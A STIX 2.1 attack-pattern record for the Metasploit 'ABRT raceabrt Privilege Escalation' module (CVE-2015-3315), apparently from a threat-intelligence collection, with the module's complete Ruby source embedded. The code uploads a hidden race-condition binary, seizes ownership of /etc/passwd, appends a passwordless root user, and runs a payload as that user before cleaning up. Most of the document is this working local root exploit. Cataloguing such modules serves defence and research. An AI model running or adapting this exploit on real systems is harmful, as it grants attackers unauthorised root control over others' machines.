{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a797bf66-e453-4fea-ab53-06c6f86c2f1d",
    "created": "2024-08-14T16:59:39.126346Z",
    "modified": "2024-08-14T16:59:39.12635Z",
    "name": "ABRT raceabrt Privilege Escalation",
    "description": " This module attempts to gain root privileges on Linux systems with a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured as the crash handler.  A race condition allows local users to change ownership of arbitrary",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/abrt_raceabrt_priv_esc.rb",
            "external_id": "abrt_raceabrt_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3315"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/taviso/fe359006836d6cd1091e"
        },
        {
            "source_name": "reference",
            "url": "http://www.openwall.com/lists/oss-security/2015/04/14/4"
        },
        {
            "source_name": "reference",
            "url": "http://www.openwall.com/lists/oss-security/2015/04/16/12"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/abrt/abrt/commit/80408e9e24a1c10f85fd969e1853e0f192157f92"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/cve-2015-1862"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/cve-2015-3315"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/articles/1415483"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1211223"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1211835"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1218239"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ABRT raceabrt Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges on Linux systems with\n          a vulnerable version of Automatic Bug Reporting Tool (ABRT) configured\n          as the crash handler.\n\n          A race condition allows local users to change ownership of arbitrary\n          files (CVE-2015-3315). This module uses a symlink attack on\n          `/var/tmp/abrt/*/maps` to change the ownership of `/etc/passwd`,\n          then adds a new user with UID=0 GID=0 to gain root privileges.\n          Winning the race could take a few minutes.\n\n          This module has been tested successfully on:\n\n          abrt 2.1.11-12.el7 on RHEL 7.0 x86_64;\n          abrt 2.1.5-1.fc19 on Fedora Desktop 19 x86_64;\n          abrt 2.2.1-1.fc19 on Fedora Desktop 19 x86_64;\n          abrt 2.2.2-2.fc20 on Fedora Desktop 20 x86_64;\n          abrt 2.3.0-3.fc21 on Fedora Desktop 21 x86_64.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Tavis Ormandy', # Discovery and C exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2015-04-14',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'References' => [\n          [ 'CVE', '2015-3315' ],\n          [ 'EDB', '36747' ],\n          [ 'BID', '75117' ],\n          [ 'URL', 'https://gist.github.com/taviso/fe359006836d6cd1091e' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/14/4' ],\n          [ 'URL', 'http://www.openwall.com/lists/oss-security/2015/04/16/12' ],\n          [ 'URL', 'https://github.com/abrt/abrt/commit/80408e9e24a1c10f85fd969e1853e0f192157f92' ],\n          [ 'URL', 'https://access.redhat.com/security/cve/cve-2015-1862' ],\n          [ 'URL', 'https://access.redhat.com/security/cve/cve-2015-3315' ],\n          [ 'URL', 'https://access.redhat.com/articles/1415483' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211223' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1211835' ],\n          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=1218239' ]\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_stat\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptInt.new('TIMEOUT', [ true, 'Race timeout (seconds)', '900' ]),\n        OptString.new('USERNAME', [ false, 'Username of new UID=0 user (default: random)', '' ])\n      ]\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n\n    self.needs_cleanup = true\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  def check\n    if immutable?('/etc/passwd')\n      vprint_error 'File /etc/passwd is immutable'\n      return CheckCode::Safe\n    end\n\n    kernel_core_pattern = cmd_exec 'grep abrt-hook-ccpp /proc/sys/kernel/core_pattern'\n    unless kernel_core_pattern.include? 'abrt-hook-ccpp'\n      vprint_error 'System is NOT configured to use ABRT for crash reporting'\n      return CheckCode::Safe\n    end\n    vprint_good 'System is configured to use ABRT for crash reporting'\n\n    if cmd_exec('[ -d /var/spool/abrt ] && echo true').include? 'true'\n      vprint_error \"Directory '/var/spool/abrt' exists. System has been patched.\"\n      return CheckCode::Safe\n    end\n    vprint_good 'System does not appear to have been patched'\n\n    unless cmd_exec('[ -d /var/tmp/abrt ] && echo true').include? 'true'\n      vprint_error \"Directory '/var/tmp/abrt' does NOT exist\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Directory '/var/tmp/abrt' exists\"\n\n    if cmd_exec('systemctl status abrt-ccpp | grep Active').include? 'inactive'\n      vprint_error 'abrt-ccp service NOT running'\n      return CheckCode::Safe\n    end\n    vprint_good 'abrt-ccpp service is running'\n\n    pkg_info = cmd_exec('yum list installed abrt | grep abrt').to_s\n    abrt_version = pkg_info[/^abrt.*$/].to_s.split(/\\s+/)[1]\n    unless abrt_version.blank?\n      vprint_status \"System is using ABRT package version #{abrt_version}\"\n    end\n\n    CheckCode::Detected\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    cmd_exec \"chmod +x '#{path}'\"\n    register_file_for_cleanup path\n  end\n\n  def exploit\n    if check != CheckCode::Detected\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    @chown_file = '/etc/passwd'\n\n    if datastore['USERNAME'].blank?\n      @username = rand_text_alpha rand(7..10)\n    else\n      @username = datastore['USERNAME']\n    end\n\n    # Upload Tavis Ormandy's raceabrt exploit:\n    # - https://www.exploit-db.com/exploits/36747/\n    # Cross-compiled with:\n    # - i486-linux-musl-cc -static raceabrt.c\n    path = ::File.join Msf::Config.data_directory, 'exploits', 'cve-2015-3315', 'raceabrt'\n    fd = ::File.open path, 'rb'\n    executable_data = fd.read fd.stat.size\n    fd.close\n\n    executable_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    upload_and_chmodx executable_path, executable_data\n\n    # Change working directory to base_dir\n    cmd_exec \"cd '#{base_dir}'\"\n\n    # Launch raceabrt executable\n    print_status \"Trying to own '#{@chown_file}' - This might take a few minutes (Timeout: #{timeout}s) ...\"\n    output = cmd_exec \"#{executable_path} #{@chown_file}\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n\n    # Check if we own /etc/passwd\n    unless cmd_exec(\"[ -w #{@chown_file} ] && echo true\").include? 'true'\n      fail_with Failure::Unknown, \"Failed to own '#{@chown_file}'\"\n    end\n\n    print_good \"Success! '#{@chown_file}' is writable\"\n\n    # Add new user with no password\n    print_status \"Adding #{@username} user to #{@chown_file} ...\"\n    cmd_exec \"echo '#{@username}::0:0::/root:/bin/bash' >> #{@chown_file}\"\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Execute payload executable\n    vprint_status 'Executing payload...'\n    cmd_exec \"/bin/bash -c \\\"echo #{payload_path} | su - #{@username}&\\\"\"\n  end\n\n  def on_new_session(session)\n    if session.type.to_s.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n    end\n\n    # Reinstate /etc/passwd root ownership and remove new user\n    root_owns_passwd = false\n    new_user_removed = false\n\n    if session.type.to_s.eql? 'meterpreter'\n      # Reinstate /etc/passwd root ownership\n      session.sys.process.execute '/bin/sh', \"-c \\\"chown root:root #{@chown_file}\\\"\"\n\n      # Remove new user\n      session.sys.process.execute '/bin/sh', \"-c \\\"sed -i 's/^#{@username}:.*$//g' #{@chown_file}\\\"\"\n\n      # Wait for clean up\n      Rex.sleep 5\n\n      # Check root ownership\n      passwd_stat = session.fs.file.stat(@chown_file).stathash\n      if passwd_stat['st_uid'] == 0 && passwd_stat['st_gid'] == 0\n        root_owns_passwd = true\n      end\n\n      # Check for new user in /etc/passwd\n      passwd_contents = session.fs.file.open(@chown_file).read.to_s\n      unless passwd_contents.include? \"#{@username}:\"\n        new_user_removed = true\n      end\n    elsif session.type.to_s.eql? 'shell'\n      # Reinstate /etc/passwd root ownership\n      session.shell_command_token \"chown root:root #{@chown_file}\"\n\n      # Remove new user\n      session.shell_command_token \"sed -i 's/^#{@username}:.*$//g' #{@chown_file}\"\n\n      # Check root ownership\n      passwd_owner = session.shell_command_token \"ls -l #{@chown_file}\"\n      if passwd_owner.to_s.include? 'root'\n        root_owns_passwd = true\n      end\n\n      # Check for new user in /etc/passwd\n      passwd_user = session.shell_command_token \"grep '#{@username}:' #{@chown_file}\"\n      unless passwd_user.to_s.include? \"#{@username}:\"\n        new_user_removed = true\n      end\n    end\n\n    unless root_owns_passwd\n      print_warning \"Could not reinstate root ownership of #{@chown_file}\"\n    end\n\n    unless new_user_removed\n      print_warning \"Could not remove user '#{@username}' from #{@chown_file}\"\n    end\n  rescue => e\n    print_error \"Error during cleanup: #{e.message}\"\n  ensure\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-04-14",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}